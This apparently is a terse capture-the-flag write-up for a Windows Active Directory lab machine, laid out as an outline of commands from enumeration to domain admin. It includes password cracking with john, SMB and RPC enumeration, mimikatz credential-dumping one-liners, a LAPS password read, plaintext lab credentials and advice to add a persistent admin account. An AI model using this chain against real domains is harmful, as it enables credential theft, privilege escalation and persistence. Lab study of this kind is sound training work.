### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 53
	- DNS
- 88
	- kerberos
- 135
	- RPC
- 139
	- RPC
- 389
	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
- 445
	- smb
- 464
	- kpasswd5
- 593
	- RPC
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
- 3269
	- tcpwrapped
- 5985
	- winrm
- 9389
	- .NET Message Framing
- 47001
	- RPC
- 49152-49158
	- RPC
- 49169
	- RPC
- 49170
	- RPC
- 49179
	- RPC
### Foothold
- DNS
	- nslookup
		- server $IP
		- 127.0.0.1
	- dig @$IP domain
		- If domain resolves
			- dig axfr @$IP domain
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
		- READ IPC$  Shares
		- Shares
			- Dev
				- winrm_backup.zip
					- legacyy_dev_auth.pfx
						- Requires a password to unzip the files
						- zip2john winrm_backup.zip > winrm_backup.hash
						- john  --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
							- supremelegacy
					- pfx file also requires a password
						- Generates the key:
							- openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth
						- Generate pass hash and crack pass hash
							- pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
							- john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
								- thuglegacy
						- Extract key
							- openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
							- openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
						- Connect with key
							- evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
			- Helpdesk
				- LAPS files
	- nmap --script smb-vuln* -p135,139,445 $IP
### PE
#### Windows
- legacyy
	- whoami /all
		- privs
			- SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege Enabled
	- Root drive directory
	- net user USERNAME
		- Check group memberships
		- RDP, Development
	- systeminfo
		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
	- history
		- (Get-PSReadLineOption).HistorySavePath
		- `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
	- Users with console
	- Services
		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
		- Unquoted
			- cmd
				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
				- wmic service get name,displayname,pathname
			- PS1
				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
			- icacls Filepath before .exe
				- Looking for W or F
	- netstat -ano
		- Active ports
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
- svc_deploy
	- Connect
		- evil-winrm -i $IP -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
	- whoami /all
		- Nothing New
	- net user svc_deploy
		- LAPS_Readers
			- Allows account to manage local admin password
			- Get-ADComputer DC01 -property 'ms-mcs-admpwd'
				- Gives password for the administrator account
				- ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
		- RDP
- administrator
	- Connect
		- evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'

### Credentials
### Lessons Learned
- Check system history
- If LAPS is enabled it rotates the password. Make sure to create a new admin account with a static password to get persistence